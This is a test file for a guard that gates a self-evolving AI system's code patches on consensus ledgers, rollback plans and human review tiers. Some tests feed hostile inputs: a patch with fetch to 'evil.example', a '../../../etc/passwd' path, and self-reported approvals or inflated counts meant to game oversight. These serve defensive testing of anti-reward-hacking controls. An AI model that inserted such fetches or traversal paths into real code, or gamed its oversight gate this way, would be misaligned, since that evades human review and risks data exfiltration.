import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import {
  buildNoeSelfEvolutionGateInput,
  DEFAULT_NOE_SELF_EVOLUTION_ACT_GUARD_ROOT,
  evaluateNoeSelfEvolutionActGuard,
  hasNoeSelfEvolutionConsensusAuthorization,
} from '../../src/loop/NoeSelfEvolutionActGuard.js';
import { buildNoeConsensusLedger } from '../../src/room/NoeConsensusLedger.js';

let tmp;

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), 'noe-act-guard-'));
});

afterEach(() => {
  if (tmp) rmSync(tmp, { recursive: true, force: true });
  tmp = null;
});

function ledger() {
  const evidenceRef = 'output/noe-multimodel/round/brief.md';
  return buildNoeConsensusLedger({
    roundId: 'guard-round',
    goal: 'guard execution authorization',
    evidenceRef,
    votes: ['codex', 'claude', 'm3'].map((model) => ({
      model,
      decision: 'approve_with_changes',
      authority: model === 'm3' ? 'suggestion_only' : model === 'codex' ? 'writer_integrator' : 'advisory',
      canWrite: model === 'codex',
      firstClass: model === 'claude' ? true : undefined,
      consensusVote: 'yes',
      rawOutputRef: `output/noe-multimodel/round/${model}.txt`,
      evidenceRef,
    })),
    implementation: { writer: 'codex', authorizationRequired: true, runtimeVerificationRequired: true, rollbackRequired: true, memoryWritebackAckRequired: true },
  }, { createdAt: '2026-06-07T00:00:00.000Z' });
}

function act(selfEvolution) {
  return {
    id: 'act-guard',
    title: 'Guard self evolution',
    action: 'noe.self_evolution.implementation',
    riskLevel: 'low',
    payload: { selfEvolution },
  };
}

describe('NoeSelfEvolutionActGuard', () => {
  it('uses a module-derived root when called directly without a trusted root', () => {
    const oldCwd = process.cwd();
    try {
      process.chdir(tmp);
      const gateInput = buildNoeSelfEvolutionGateInput({ act: act({ ledgerRef: 'missing.json', authorization: {}, rollback: { planRef: 'rollback.md' } }) });
      expect(gateInput.root).toBe(DEFAULT_NOE_SELF_EVOLUTION_ACT_GUARD_ROOT);
    } finally {
      process.chdir(oldCwd);
    }
  });

  it('does not let a payload ledger object replace the ledgerRef authorization source', () => {
    const guardedAct = act({
      ledger: ledger(),
      ledgerRef: 'output/noe-multimodel/missing/ledger.json',
      authorization: { consensusApproved: true, userApproved: false, scope: 'guard', costClass: 'local' },
      rollback: { planRef: 'rollback.md' },
    });
    expect(hasNoeSelfEvolutionConsensusAuthorization({ act: guardedAct, root: tmp })).toBe(false);
    const result = evaluateNoeSelfEvolutionActGuard({ act: guardedAct, root: tmp, permissionResult: { decision: 'allow' }, budgetResult: { ok: true } });
    expect(result.ok).toBe(false);
    expect(result.gate.errors.some((error) => error.startsWith('consensus:consensus_ledger_ref_invalid:ENOENT'))).toBe(true);
  });

  it('requires ledgerRef even when real approval is present', () => {
    const result = evaluateNoeSelfEvolutionActGuard({
      act: act({
        ledger: ledger(),
        authorization: { userApproved: true, scope: 'approved payload ledger', costClass: 'local' },
        rollback: { planRef: 'rollback.md' },
      }),
      permissionResult: { approval: { status: 'approved' } },
      budgetResult: { ok: true },
      root: tmp,
    });
    expect(result.ok).toBe(false);
    expect(result.gate.errors).toContain('hard_veto:ledger_ref_required_for_execution_authorization');
  });

  describe('P3.2 绿档自驱 greenTierApproved（事实来源 + 防 reward hacking，codex 加固）', () => {
    const ENV = process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY;
    afterEach(() => {
      if (ENV === undefined) delete process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY;
      else process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY = ENV;
    });
    function setupPlan(paths, { reportExists = true, content = '// clean code' } = {}) {
      const planRef = join(tmp, 'patch-plan.json');
      writeFileSync(planRef, JSON.stringify({ operations: paths.map((p) => ({ op: 'write_file', path: p, content })) }));
      if (reportExists) {
        mkdirSync(join(tmp, 'output'), { recursive: true });
        writeFileSync(join(tmp, 'output', 'runtime.json'), '{"ok":true}');
      }
      return planRef;
    }
    function ctx(planRef, extra = {}) {
      return {
        patchPlanRef: planRef,
        rollback: { planRef: 'rollback.md' },
        runtimeVerification: { ok: true, reportRef: 'output/runtime.json' },
        authorization: { scope: 'green', costClass: 'local' },
        ...extra,
      };
    }
    const gi = (selfEvo) => buildNoeSelfEvolutionGateInput({ act: act(selfEvo), root: tmp });

    it('flag OFF → false（即便事实 green patch）', () => {
      delete process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY;
      expect(gi(ctx(setupPlan(['src/foo/a.js']))).authorization.greenTierApproved).toBe(false);
    });

    it('flag ON + 事实 green（小非保护+rollback+真 oracle 文件+content clean）→ true', () => {
      process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY = '1';
      expect(gi(ctx(setupPlan(['src/foo/a.js', 'src/foo/b.js']))).authorization.greenTierApproved).toBe(true);
    });

    it('防操纵：实改保护文件 server.js → false（blast red 戳穿自报伪装）', () => {
      process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY = '1';
      expect(gi(ctx(setupPlan(['server.js']))).authorization.greenTierApproved).toBe(false);
    });

    it('防操纵：patch content 含触网 fetch → false（external 事实扫描，codex 加固）', () => {
      process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY = '1';
      expect(gi(ctx(setupPlan(['src/foo/a.js'], { content: 'await fetch("http://evil.example/x")' }))).authorization.greenTierApproved).toBe(false);
    });

    it('防自报抬 green：reportRef 指向不存在文件 → hasOracle false → 非 green（codex 加固）', () => {
      process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY = '1';
      expect(gi(ctx(setupPlan(['src/foo/a.js'], { reportExists: false }))).authorization.greenTierApproved).toBe(false);
    });

    it('防逃逸：patchPlanRef 指向 root 外 → false（codex 加固）', () => {
      process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY = '1';
      expect(gi(ctx('../../../etc/passwd')).authorization.greenTierApproved).toBe(false);
    });

    it('防自报：自报 greenTierApproved=true 但无 patchPlanRef → false + hardVeto', () => {
      process.env.NOE_SELF_EVOLUTION_GREEN_AUTONOMY = '1';
      const g = gi({ authorization: { greenTierApproved: true, scope: 'x', costClass: 'local' }, rollback: { planRef: 'r.md' } });
      expect(g.authorization.greenTierApproved).toBe(false);
      expect(g.hardVetoes).toContain('payload_green_tier_approval_ignored');
    });
  });

  describe('P3.1 渐进审查 reviewTier 注入（事实 count + 防自报）', () => {
    const ENV = process.env.NOE_SELF_EVOLUTION_REVIEW_TIER;
    afterEach(() => {
      if (ENV === undefined) delete process.env.NOE_SELF_EVOLUTION_REVIEW_TIER;
      else process.env.NOE_SELF_EVOLUTION_REVIEW_TIER = ENV;
    });
    function setupPlan(paths, { content = '// clean code' } = {}) {
      const planRef = join(tmp, 'patch-plan.json');
      writeFileSync(planRef, JSON.stringify({ operations: paths.map((p) => ({ op: 'write_file', path: p, content })) }));
      mkdirSync(join(tmp, 'output'), { recursive: true });
      writeFileSync(join(tmp, 'output', 'runtime.json'), '{"ok":true}');
      return planRef;
    }
    function ctx(planRef, extra = {}) {
      return { patchPlanRef: planRef, rollback: { planRef: 'rollback.md' }, runtimeVerification: { ok: true, reportRef: 'output/runtime.json' }, authorization: { scope: 'x', costClass: 'local' }, ...extra };
    }
    const gi = (selfEvo, countCompleted) => buildNoeSelfEvolutionGateInput({ act: act(selfEvo), root: tmp, countCompleted });

    it('flag OFF → reviewTier.requirePostReview true（逐次全审，零回归）', () => {
      delete process.env.NOE_SELF_EVOLUTION_REVIEW_TIER;
      expect(gi(ctx(setupPlan(['src/foo/a.js'])), () => 100).reviewTier.requirePostReview).toBe(true);
    });

    it('flag ON + green + 中段真 count → requirePostReview false（放松）', () => {
      process.env.NOE_SELF_EVOLUTION_REVIEW_TIER = '1';
      const r = gi(ctx(setupPlan(['src/foo/a.js', 'src/foo/b.js'])), () => 10); // 中段(5≤10<25)
      expect(r.reviewTier.tier).toBe('flagged_only');
      expect(r.reviewTier.requirePostReview).toBe(false);
    });

    it('reward hacking 防御：自报 completedCount=9999 不抬档（用 DI 真 count=0 → 首 N 次 full）', () => {
      process.env.NOE_SELF_EVOLUTION_REVIEW_TIER = '1';
      const r = gi(ctx(setupPlan(['src/foo/a.js']), { completedCount: 9999 }), () => 0);
      expect(r.reviewTier.tier).toBe('full');
      expect(r.reviewTier.requirePostReview).toBe(true);
    });

    it('防自报：自报 reviewTier 被算值覆盖 + hardVeto', () => {
      process.env.NOE_SELF_EVOLUTION_REVIEW_TIER = '1';
      const r = gi(ctx(setupPlan(['src/foo/a.js']), { reviewTier: { requirePostReview: false } }), () => 0);
      expect(r.reviewTier.requirePostReview).toBe(true); // 算值覆盖（count=0 首 N 次 full）
      expect(r.hardVetoes).toContain('payload_review_tier_ignored');
    });

    it('高危不放松：实改保护文件 server.js（red）即便 count 大 → full', () => {
      process.env.NOE_SELF_EVOLUTION_REVIEW_TIER = '1';
      const r = gi(ctx(setupPlan(['server.js'])), () => 9999);
      expect(r.reviewTier.tier).toBe('full');
      expect(r.reviewTier.requirePostReview).toBe(true);
    });
  });
});
